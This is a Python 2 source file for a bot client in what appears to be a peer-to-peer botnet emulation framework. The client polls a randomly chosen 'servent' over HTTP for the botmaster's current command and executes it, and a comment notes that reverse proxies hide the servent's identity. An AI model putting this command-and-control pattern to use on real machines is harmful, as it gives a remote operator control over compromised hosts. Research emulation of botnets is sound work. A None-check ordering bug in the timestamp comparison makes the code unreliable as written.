#!/usr/bin/env python2
# coding=UTF-8
import random, json, logging
import requests
from actors.AbstractBot import CommandExecutor
from actors.BotCommands import executeCurrentCommand
from resources import emu_config


class Client(CommandExecutor):
    def __init__(self, peerlist, *args, **kwargs):
        super(Client, self).__init__(*args, **kwargs)
        self.peerlist = peerlist

    def performDuty(self):
        # If we know at least one servent
        if len(self.peerlist) > 0:
            try:
                servent = random.choice(self.peerlist)
                self._fetchCurrentCommand(servent)
                # Execute old command if no new command was fetched
                if self.current_command is not None:
                    self._executeCurrentCommand()
            except Exception as ex:
                logging.warning("Duty of bot %s failed with %s: %s"%(self.name, type(ex).__name__, ex))

    def _fetchCurrentCommand(self, servent):
        """Fetches a command from the Servent and executes it. This way the Botmaster can control the clients.
        The Servent does not need to keep track of their addresses because they pull from it and reverse proxies
        can be used, so that the clients do not need to know the identity of the Servent. """

        response = requests.get("http://%s:%s/current_command"%(servent, emu_config.PORT),
                                headers={"Accept": "application/json"})

        if response.status_code == 200:
            newCmd = json.loads(response.text)
            if newCmd["timestamp"] > self.current_command["timestamp"] or self.current_command is None:
                logging.debug("Replaced command %s with %s"%(self.current_command, newCmd))
                self.current_command = newCmd
        else:
            self.current_command = None

    def _executeCurrentCommand(self):
        """Executes the last command that has been fetched from the Servent"""

        if isinstance(self.current_command, dict) and self.current_command.has_key("command") \
                and self.current_command["command"] != "":
            try:
                executeCurrentCommand(self.current_command)
            except TypeError as ex:
                logging.warning("Command %s got invalid parameters %s: %s"
                                %(self.current_command["command"], self.current_command["kwargs"], ex.message))
